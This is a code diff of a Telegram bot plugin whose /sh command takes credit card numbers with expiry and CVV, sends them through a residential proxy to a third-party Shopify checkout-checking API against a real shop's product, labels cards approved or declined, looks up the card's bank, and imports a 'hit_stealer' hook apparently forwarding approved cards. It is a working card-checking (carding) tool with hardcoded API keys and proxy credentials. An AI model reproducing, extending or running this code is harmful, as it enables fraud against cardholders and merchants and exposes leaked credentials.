@@ -1,7 +1,7 @@
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from pyrogram.enums import ChatType
-import requests, re, time, httpx
+import httpx, re, time, requests
 from plugins.func.users_sql import *
 from plugins.tools.hit_stealer import send_hit_if_approved
 from datetime import date
@@ -28,9 +28,7 @@ async def cmd_sh(client, message):
 
         if chat_type == ChatType.PRIVATE and role == "FREE":
             return await message.reply_text(
-                "Premium Users Required ⚠️\n"
-                "Only Premium Users can use this command in bot PM.\n"
-                "Join group for free use:",
+                "Premium Users Required ⚠️\nOnly Premium Users can use this command in bot PM.\nJoin group for free use:",
                 reply_markup=InlineKeyboardMarkup([
                     [InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]
                 ]),
@@ -55,7 +53,6 @@ async def cmd_sh(client, message):
         if not cc_text:
             return await message.reply_text("❌ Usage: /sh <cc|mm|yy|cvv>")
 
-        # Extract CC from any format using regex
         match = re.search(r"(\d{12,16})[^\d]?(\d{1,2})[^\d]?(\d{2,4})[^\d]?(\d{3,4})", cc_text)
         if not match:
             return await message.reply_text("❌ Invalid format. Use cc|mm|yy|cvv")
@@ -73,45 +70,56 @@ async def cmd_sh(client, message):
 """)
 
         tic = time.perf_counter()
-        payload = {
-            "key": "VDX-SHA2X-NZ0RS-O7HAM",
-            "data": {
-                "card": fullcc,
-                "product_url": "https://godless.com/collections/the-drop-all-new-shit/products/dark-corners-on-flat-surfaces-by-adler-tittle",
-                "email": None,
-                "proxy": "proxy.rampageproxies.com:5000:package-1111111-country-us-city-bloomington-region-indiana:5671nuWwEPrHCw2t",
-                "ship_address": None,
-                "is_shippable": False
-            }
-        }
 
-        try:
-            async with httpx.AsyncClient(timeout=20) as http_client:
+        async with httpx.AsyncClient(timeout=20) as http_client:
+            payload = {
+                "key": "VDX-SHA2X-NZ0RS-O7HAM",
+                "data": {
+                    "card": fullcc,
+                    "product_url": "https://godless.com/collections/the-drop-all-new-shit/products/dark-corners-on-flat-surfaces-by-adler-tittle",
+                    "email": None,
+                    "proxy": "proxy.rampageproxies.com:5000:package-1111111-country-us:5671nuWwEPrHCw2t",
+                    "ship_address": None,
+                    "is_shippable": False
+                }
+            }
+
+            try:
                 res = await http_client.post("https://api.voidapi.xyz/v2/shopify_graphql", json=payload)
                 response = res.json()
                 msg_raw = response.get("message") or response.get("error") or "No response"
                 msg_check = msg_raw.lower()
                 card_status = "approved" if any(x in msg_check for x in ["processedreceipt", "zip", "avs", "charged"]) else "declined"
                 card_message = msg_raw
-        except Exception as e:
-            card_status = "error"
-            card_message = f"Request failed: {e}"
+            except Exception as e:
+                card_status = "error"
+                card_message = f"Request failed: {e}"
 
-        toc = time.perf_counter()
-
+        # BIN Lookup using VoidAPI with proxy
         try:
-            binres = session.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}", timeout=10).json()
-            brand = binres.get("brand") or binres.get("scheme") or "UNKNOWN"
-            type_ = binres.get("type") or "N/A"
-            level = binres.get("level") or "N/A"
-            bank = binres.get("bank") or "N/A"
-            country = binres.get("country_name") or "N/A"
+            headers = {
+                "User-Agent": "Mozilla/5.0",
+                "Accept": "application/json"
+            }
+            proxies = {
+                "http": "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000",
+                "https": "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000"
+            }
+            url = f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}"
+            res = session.get(url, headers=headers, proxies=proxies, timeout=15)
+            binres = res.json()
+            brand = str(binres.get("brand") or binres.get("scheme") or "N/A").upper()
+            type_ = str(binres.get("type", "N/A")).upper()
+            level = str(binres.get("level", "N/A")).upper()
+            bank = str(binres.get("bank", "N/A")).upper()
+            country = str(binres.get("country_name", "N/A")).upper()
             flag = binres.get("country_flag") or "🏳️"
-        except:
+        except Exception as e:
+            print("[DEBUG] BIN VoidAPI Proxy Error:", str(e))
             brand = type_ = level = bank = country = "N/A"
             flag = "🏳️"
 
-        brand, type_, level, bank, country = [str(i or "N/A").upper() for i in [brand, type_, level, bank, country]]
+        toc = time.perf_counter()
         status = "Approved ✅" if card_status == "approved" else "Declined ❌"
 
         final_msg = f"""
